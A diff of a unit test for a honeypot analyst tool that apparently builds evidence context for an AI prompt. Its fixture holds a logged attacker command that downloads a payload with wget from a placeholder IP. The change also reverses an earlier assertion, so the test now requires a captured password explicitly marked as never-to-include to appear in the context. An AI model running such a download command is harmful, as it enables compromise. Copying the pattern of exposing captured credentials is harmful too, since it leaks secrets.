@@ -46,7 +46,7 @@ class AnalystContext(unittest.TestCase):
         self.assertIn("Services monitor", c)
 
 
-    def test_honeypot_context_includes_commands_and_rule_backed_attack_candidates_without_passwords(self):
+    def test_honeypot_context_includes_commands_credentials_and_rule_backed_attack_candidates(self):
         nm = fake_nm()
         nm.honeyan.sessions = lambda hours, limit: {
             "total": 1,
@@ -63,12 +63,23 @@ class AnalystContext(unittest.TestCase):
             "tag_info": {"recon": {"attack": "T1082"},
                          "make-executable": {"attack": "T1222.002"}}
         }
+        nm.honeypot.evidence = lambda: [{"ip": "198.51.100.44", "creds": "root / never-include-this-password",
+                                         "data": "raw-decoy-event"}]
+        nm.honeyan.evidence = lambda: {
+            "session_records": [{"logins": [{"u": "root", "p": "never-include-this-password", "ok": True}],
+                                 "commands": [{"cmd": "wget http://198.51.100.44/payload"}]}],
+            "samples": [{"sha256": "a" * 64, "yara": {"matches": [{"rule": "Test_Malware_Rule"}]}}],
+            "runtime_events_by_sample": {"a" * 64: [{"destination_ip": "198.51.100.44", "port": 443}]}
+        }
         context = analyst.topic_context(nm, "investigate my honeypot session")
         self.assertIn("command observed: uname -a", context)
         self.assertIn("DETERMINISTIC ATT&CK CANDIDATES: T1082 (recon)", context)
         self.assertIn("T1222.002 (make-executable)", context)
         self.assertIn("decoy accepted a login", context)
-        self.assertNotIn("never-include-this-password", context)
+        self.assertIn("never-include-this-password", context)
+        self.assertIn("raw-decoy-event", context)
+        self.assertIn("Test_Malware_Rule", context)
+        self.assertIn("runtime_events_by_sample", context)
 
     def test_prompt_requires_evidence_backed_attack_ids_and_distinguishes_decoy_events(self):
         self.assertIn("Never invent, guess, or add an ID", analyst.SYSTEM_PROMPT)
